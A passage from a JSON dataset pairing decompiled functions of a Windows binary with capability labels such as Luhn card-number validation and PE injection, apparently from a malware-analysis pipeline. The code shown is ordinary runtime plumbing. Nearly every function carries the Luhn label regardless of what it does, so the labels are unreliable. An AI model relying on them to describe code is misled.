        "decompiled_code": "\nuint32_t __cdecl fcn.0040eae0(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    do {\n        uVar2 = *(arg_8h + -0x2fc + in_EAX * 8) + *(arg_8h + -0x300 + in_EAX * 8);\n        bVar1 = *(arg_8h + -0x100 + in_EAX * 4) < uVar2;\n        uVar2 = uVar2 & 0xffffff00 | bVar1;\n        in_EAX = in_EAX + -1;\n        if (!bVar1) {\n            return uVar2;\n        }\n    } while (-1 < in_EAX);\n    return uVar2;\n}\n",
        "token_count": 183
    },
    "0040eb10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040eb10(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    uVar3 = 1;\n    piVar1 = arg_8h + -0x100 + in_EAX * 4;\n    *piVar1 = *piVar1 + 1;\n    iVar2 = *(arg_8h + -0x2fc + in_EAX * 8);\n    if (iVar2 + *(arg_8h + -0x300 + in_EAX * 8) <= *(arg_8h + -0x100 + in_EAX * 4)) {\n        if (in_EAX == 0) {\n            uVar3 = 0;\n        }\n        else {\n            *(arg_8h + -0x100 + in_EAX * 4) = iVar2;\n            uVar3 = fcn.0040eb10(arg_8h);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 237
    },
    "0040eb6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040eb6c(code *param_1, uint16_t *param_2)\n\n{\n    char cVar1;\n    ushort *in_EAX;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    uint plLbound;\n    uint var_31ch;\n    uint ppvData;\n    uint16_t *psa;\n    uint32_t cDims;\n    int32_t plUbound;\n    code *var_308h;\n    ushort *pvargDest;\n    uint rgsabound;\n    uint var_2fch;\n    uint rgIndices;\n    \n    var_308h = param_1;\n    pvargDest = in_EAX;\n    if ((*(param_2 + 1) & 0x20) == 0) {\n        fcn.0040e798();\n    }\n    if ((*param_2 & 0xfff) == 0xc) {\n        if ((*param_2 & 0x4000) == 0) {\n            psa = *(param_2 + 4);\n        }\n        else {\n            psa = **(param_2 + 4);\n        }\n        uVar2 = *psa;\n        cDims = uVar2;\n        if (-1 < uVar2 - 1) {\n            iVar6 = 0;\n            piVar5 = &rgsabound;\n            do {\n                sub.oleaut32.dll_SafeArrayGetLBound(psa, iVar6 + 1, piVar5 + 1);\n                fcn.0040e798();\n                sub.oleaut32.dll_SafeArrayGetUBound();\n                fcn.0040e798();\n                *piVar5 = (plUbound - piVar5[1]) + 1;\n                iVar6 = iVar6 + 1;\n                piVar5 = piVar5 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        iVar6 = sub.oleaut32.dll_SafeArrayCreate(0xc, cDims, &rgsabound);\n        if (iVar6 == 0) {\n            fcn.0040e4f0();\n        }\n        fcn.0040eac4();\n        *pvargDest = 0x200c;\n        *(pvargDest + 4) = iVar6;\n        if (-1 < cDims - 1) {\n            puVar3 = &var_2fch;\n            puVar4 = &rgIndices;\n            uVar2 = cDims;\n            do {\n                *puVar4 = *puVar3;\n                puVar4 = puVar4 + 1;\n                puVar3 = puVar3 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        do {\n            cVar1 = fcn.0040eae0(&stack0xfffffffc);\n            if (cVar1 != '\\0') {\n                sub.oleaut32.dll_SafeArrayPtrOfIndex(psa, &rgIndices, &ppvData);\n                fcn.0040e798();\n                sub.oleaut32.dll_SafeArrayPtrOfIndex(iVar6, &rgIndices, &var_31ch);\n                fcn.0040e798();\n                (*var_308h)();\n            }\n            cVar1 = fcn.0040eb10(&stack0xfffffffc);\n        } while (cVar1 != '\\0');\n    }\n    else {\n        sub.oleaut32.dll_VariantCopy(pvargDest, param_2);\n        fcn.0040e798();\n    }\n    return;\n}\n",
        "token_count": 823
    },
    "0040ef64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040ef64(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint *puStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint pvarg;\n    uint var_8h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_14h = 0;\n    uStack44 = 0x40f023;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = &fcn.0040ef64::pvarg;\n    puStack56 = 0x40ef8f;\n    sub.oleaut32.dll_VariantInit();\n    uStack60 = 0x40f001;\n    iStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &stack0xfffffffc;\n    (***0x46211c)(&fcn.0040ef64::pvarg);\n    fcn.0040e7a4();\n    arg_8h = &fcn.0040ef64::var_14h;\n    fcn.00404798();\n    fcn.00404884(arg_8h);\n    fcn.00404230();\n    *in_FS_OFFSET = arg_8h;\n    fcn.0040eac4(0x40f008);\n    return;\n}\n",
        "token_count": 355
    },
    "0040f030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040f030(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    \n    puStack32 = &fcn.0040f030::pvarg;\n    puStack36 = 0x40f045;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x40f086;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.0040edec();\n    (**0x463814)();\n    fcn.0040f118();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x40f08d;\n    uStack40 = 0x40f085;\n    fcn.0040eac4();\n    return;\n}\n",
        "token_count": 210
    },
    "0040f65c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040f65c(uint param_1, uint param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint pvarg;\n    uint var_8h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x40f706;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = &fcn.0040f65c::pvarg;\n    puStack52 = 0x40f684;\n    sub.oleaut32.dll_VariantInit();\n    uStack56 = 0x40f6e9;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uVar3 = 8;\n    uVar2 = 0;\n    uVar1 = 0x400;\n    puStack52 = &stack0xfffffffc;\n    (***0x46211c)(&fcn.0040f65c::pvarg);\n    fcn.0040e7a4();\n    fcn.00404798();\n    fcn.00404884(param_2);\n    *in_FS_OFFSET = param_2;\n    fcn.0040eac4(0x40f6f0, uVar1, uVar2, uVar3);\n    return;\n}\n",
        "token_count": 368
    },
    "0040f714": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040f714(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    \n    puStack32 = &fcn.0040f714::pvarg;\n    puStack36 = 0x40f729;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x40f76a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.0040edec();\n    (**0x463814)();\n    fcn.0040f840();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x40f771;\n    uStack40 = 0x40f769;\n    fcn.0040eac4();\n    return;\n}\n",
        "token_count": 210
    },
    "00410054": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject pe/d5f0df8b10fc4abbbb9974951b6b6eb4"
        ],
        "decompiled_code": "\nvoid fcn.00410054(void)\n\n{\n    char cVar1;\n    uint16_t in_AX;\n    int32_t *in_FS_OFFSET;\n    uint *puStack552;\n    int32_t iStack548;\n    uint uStack544;\n    uchar *puStack540;\n    uint var_208h;\n    uint var_204h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack540 = &stack0xfffffffc;\n    uStack544 = 0x41017a;\n    iStack548 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffddc;\n    if ((in_AX & 0xfff) < 0x15) {\n        puStack552 = 0x410098;\n        puStack540 = &stack0xfffffffc;\n        fcn.00403ffc();\n    }\n    else if (in_AX == 0x100) {\n        puStack552 = 0x4100b0;\n        puStack540 = &stack0xfffffffc;\n        fcn.00403ffc();\n    }\n    else if (in_AX == 0x101) {\n        puStack552 = 0x4100c8;\n        puStack540 = &stack0xfffffffc;\n        fcn.00403ffc();\n    }\n    else {\n        cVar1 = fcn.004104b0();\n        if (cVar1 == '\\0') {\n            fcn.00407f64();\n            puStack552 = 0x41013b;\n            fcn.004042b4();\n        }\n        else {\n            puStack552 = &fcn.00410054::var_104h;\n            fcn.004031a8();\n            fcn.00402854();\n            fcn.0040420c();\n        }\n    }\n    if ((in_AX & 0x2000) != 0) {\n        fcn.004042b4();\n    }\n    if ((in_AX & 0x4000) != 0) {\n        fcn.004042b4();\n    }\n    *in_FS_OFFSET = puStack552;\n    uStack544 = 0x410181;\n    iStack548 = 0x410179;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 490
    },
    "004102bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004102bc(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    if ((arg_8h != *(in_EAX + 4)) && (cVar1 = fcn.004104b0(),  cVar1 != '\\0')) {\n        (**(*var_8h + 0x1c))(arg_8h);\n        return;\n    }\n    fcn.00410430();\n    return;\n}\n",
        "token_count": 124
    },
    "00410310": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuchar __cdecl fcn.00410310(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint32_t in_ECX;\n    uint var_1h;\n    \n    (**(*in_EAX + 0x38))(&var_1h);\n    return *(arg_8h * 3 + 0x46136a + (in_ECX >> 0x18));\n}\n",
        "token_count": 107
    },
    "00410384": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00410384(void)\n\n{\n    uint uVar1;\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    int32_t var_5h;\n    \n    uStack16 = 0x41038f;\n    *NULL = fcn.004035e4();\n    uStack16 = 0x463824;\n    uStack20 = 0x41039f;\n    var_5h._0_1_ = extraout_DL;\n    sub.kernel32.dll_EnterCriticalSection_1();\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(stack0xfffffff8 + 4) != 0) {\n        *(*0x463820 + -0x400 + *(stack0xfffffff8 + 4) * 4) = *0x461328;\n    }\n    *in_FS_OFFSET = uVar1;\n    uStack20 = 0x4103ee;\n    uStack24 = 0x463824;\n    uStack28 = 0x4103e6;\n    sub.kernel32.dll_LeaveCriticalSection_1();\n    return;\n}\n",
        "token_count": 282
    },
    "00410568": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410568(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack316;\n    uint uStack312;\n    uchar *puStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_110h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    uStack296 = 0x41063e;\n    uStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed4;\n    uStack304 = 0x463824;\n    puStack308 = 0x41059b;\n    sub.kernel32.dll_EnterCriticalSection_1();\n    uStack312 = 0x410621;\n    uStack316 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec4;\n    puStack308 = &stack0xfffffffc;\n    iVar3 = fcn.00404da8();\n    if (-1 < iVar3) {\n        iVar3 = iVar3 + 1;\n        iVar4 = 0;\n        do {\n            iVar1 = *(*0x463820 + iVar4 * 4);\n            if ((iVar1 != 0) && (iVar1 != *0x461328)) {\n                fcn.004031a8();\n                fcn.0040420c();\n                cVar2 = fcn.00407c50();\n                if (cVar2 != '\\0') {\n                    *param_2 = iVar1;\n                    break;\n                }\n            }\n            iVar4 = iVar4 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack316;\n    puStack308 = 0x410628;\n    uStack312 = 0x463824;\n    uStack316 = 0x410620;\n    sub.kernel32.dll_LeaveCriticalSection_1();\n    return;\n}\n",
        "token_count": 481
    },
    "00410ac4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410ac4(uint8_t *param_1, int32_t **param_2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    uint8_t uVar4;\n    int32_t *in_EAX;\n    uint32_t uVar5;\n    uint8_t *puVar6;\n    \n    piVar3 = param_2[2];\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar6 = (piVar3 & 0xffffff) + in_EAX;\n        uVar2 = *(**param_2 + 2 + *(**param_2 + 1));\n        uVar4 = *param_1;\n        if (uVar2 <= *param_1) {\n            uVar4 = uVar2;\n        }\n        *puVar6 = uVar4;\n        puVar1 = param_1 + 1;\n        for (uVar5 = uVar4; puVar6 = puVar6 + 1,  uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar6 = *puVar1;\n            puVar1 = puVar1 + 1;\n        }\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(piVar3 + *in_EAX))();\n        return;\n    }\n    (*piVar3)();\n    return;\n}\n",
        "token_count": 331
    },
    "00410b18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00410b18(void)\n\n{\n    fcn.00404244();\n    fcn.00410ac4();\n    return;\n}\n",
        "token_count": 33
    },
    "00410b60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410b60(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(param_2 + 0xb) == 0xff) {\n        fcn.00410b4c();\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(*(param_2 + 8) + *in_EAX))();\n        return;\n    }\n    (**(param_2 + 8))();\n    return;\n}\n",
        "token_count": 119
    },
    "00410c24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410c24(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    code *var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x410cea;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    cVar1 = ***param_2;\n    if ((cVar1 == '\\x05') || (cVar1 == '\\n')) {\n        fcn.00404230();\n        fcn.00410bf8();\n    }\n    else if (cVar1 == '\\v') {\n        var_8h = param_2[2];\n        if ((var_8h & 0xff000000) == 0xff000000) {\n            puStack32 = &stack0xfffffffc;\n            fcn.004046c4();\n        }\n        else {\n            if ((var_8h & 0xff000000) == 0xfe000000) {\n                var_8h = *(*in_EAX + var_8h);\n            }\n            if (param_2[4] == -0x80000000) {\n                puStack32 = &stack0xfffffffc;\n                (*var_8h)();\n            }\n            else {\n                puStack32 = &stack0xfffffffc;\n                (*var_8h)();\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x410cf1;\n    uStack36 = 0x410ce9;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 403
    },
    "00410f04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410f04(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(param_2 + 0xb) == 0xff) {\n        fcn.00410ef0();\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(*(param_2 + 8) + *in_EAX))();\n        return;\n    }\n    (**(param_2 + 8))();\n    return;\n}\n",
        "token_count": 118
    },
    "00410f44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410f44(uint *param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    \n    pcVar1 = *(param_2 + 8);\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar3 = in_EAX + (pcVar1 & 0xffffff);\n        uVar2 = param_1[1];\n        *puVar3 = *param_1;\n        puVar3[1] = uVar2;\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(pcVar1 + *in_EAX))();\n        return;\n    }\n    (*pcVar1)(*param_1, param_1[1]);\n    return;\n}\n",
        "token_count": 196
    },
    "00410f7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410f7c(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t *in_EAX;\n    uint *puVar2;\n    int32_t in_EDX;\n    \n    pcVar1 = *(in_EDX + 8);\n    if (*(in_EDX + 0xb) == 0xff) {\n        puVar2 = in_EAX + (pcVar1 & 0xffffff);\n        *puVar2 = arg_8h;\n        puVar2[1] = arg_ch;\n    }\n    else if (*(in_EDX + 0xb) < 0xfe) {\n        (*pcVar1)(arg_8h, arg_ch);\n    }\n    else {\n        (**(pcVar1 + *in_EAX))();\n    }\n    return;\n}\n",
        "token_count": 183
    },
    "00410fb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410fb8(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    code *pcStack16;\n    \n    pcStack16 = *(param_2 + 8);\n    if ((pcStack16 & 0xff000000) == 0xff000000) {\n        fcn.00405660();\n    }\n    else {\n        if ((pcStack16 & 0xff000000) == 0xfe000000) {\n            pcStack16 = *(*in_EAX + pcStack16);\n        }\n        if (*(param_2 + 0x10) == -0x80000000) {\n            (*pcStack16)();\n        }\n        else {\n            (*pcStack16)();\n        }\n    }\n    return;\n}\n",
        "token_count": 171
    },
    "00412850": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00412850(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 0;\n    iVar4 = *(*(in_EAX + 0xc) + 8);\n    if (-1 < iVar4 + -1) {\n        do {\n            iVar2 = fcn.00413b64();\n            cVar1 = fcn.00403484();\n            if ((cVar1 != '\\0') && ((iVar3 == 0 || (cVar1 = fcn.00403484(),  cVar1 != '\\0')))) {\n                iVar3 = iVar2;\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    return CONCAT44(param_2, iVar3);\n}\n",
        "token_count": 204
    },
    "00412a80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00412a80(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffed4;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack284 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack288 = 0x412b1b;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack292;\n    fcn.004031a8();\n    fcn.0040420c();\n    iVar1 = fcn.004129dc();\n    if (iVar1 != 0) {\n        var_10ch = var_4h;\n        var_108h._0_1_ = 0xb;\n        in_stack_fffffed4 = 0;\n        fcn.0040b630(0, &var_10ch);\n        fcn.004039e4();\n    }\n    fcn.00413a08();\n    *in_FS_OFFSET = in_stack_fffffed4;\n    uStack292 = 0x412b22;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 298
    },
    "00412c50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00412c50(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403228();\n    uVar1 = fcn.00403228();\n    *(in_EAX + 4) = uVar1;\n    sub.kernel32.dll_InitializeCriticalSection_1();\n    iVar2 = fcn.00412920();\n    fcn.00413a08();\n    *(iVar2 + 0x10) = 1;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 217
    },
    "00412da8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00412da8(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *arg_ch;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint var_10ch;\n    uint var_108h;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack276 = &stack0xfffffffc;\n    var_10ch = 0;\n    uStack280 = 0x412e2b;\n    uStack284 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack284;\n    fcn.004031a8();\n    var_8h = &var_108h;\n    var_4h._0_1_ = 4;\n    arg_ch = &var_8h;\n    arg_8h_00 = 0;\n    fcn.00405b0c();\n    fcn.0040b574(arg_8h_00, arg_ch);\n    fcn.004039e4();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack284 = 0x412e32;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 284
    },
    "00412f00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00412f00(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection_1(in_EAX + 8);\n    return;\n}\n",
        "token_count": 41
    },
    "00412fb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00412fb8(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection_1(in_EAX + 8);\n    return;\n}\n",
        "token_count": 42
    },
    "00413204": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00413204(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x413264;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_8h;\n    arg_8h = 0;\n    fcn.00405b0c();\n    fcn.0040b574(arg_8h, arg_ch);\n    fcn.004039e4();\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x41326b;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 228
    },
    "004134f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004134f4(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.0040357c();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 8) = arg_ch;\n    *(in_EAX + 0xc) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack20;\n    }\n    return;\n}\n",
        "token_count": 189
    },
    "004135d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004135d4(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    uint *in_EDX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if (-1 < arg_8h) {\n        arg_8h = arg_8h + 1;\n        iVar2 = in_ECX + 4;\n        do {\n            cVar1 = fcn.00407c50();\n            if (cVar1 != '\\0') {\n                *in_EDX = *(iVar2 + -4);\n                return 1;\n            }\n            iVar2 = iVar2 + 8;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    return 0;\n}\n",
        "token_count": 183
    },
    "00413614": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00413614(int32_t arg_8h)\n\n{\n    uint32_t in_EAX;\n    uint32_t *in_ECX;\n    uint8_t var_5h;\n    uint var_4h;\n    \n    if (-1 < arg_8h) {\n        arg_8h = arg_8h + 1;\n        do {\n            if (in_EAX == *in_ECX) {\n                var_5h = 1;\n                in_EAX = fcn.00403ffc();\n                goto code_r0x0041364b;\n            }\n            in_ECX = in_ECX + 2;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    var_5h = 0;\ncode_r0x0041364b:\n    return in_EAX & 0xffffff00 | var_5h;\n}\n",
        "token_count": 205
    },
    "0041387c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041387c(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack276 = &stack0xfffffffc;\n    uStack280 = 0x413912;\n    uStack284 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffee4;\n    if ((in_EAX != *0x412430) && (in_EAX != *(arg_8h + -8))) {\n        fcn.004031e4();\n        fcn.0041387c(arg_8h);\n        fcn.004031a8();\n        fcn.0040420c();\n        fcn.00404ff4(0);\n        fcn.00405044();\n        fcn.00413714();\n    }\n    *in_FS_OFFSET = uStack284;\n    puStack276 = 0x413919;\n    uStack280 = 0x413911;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 257
    },
    "00413ab8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
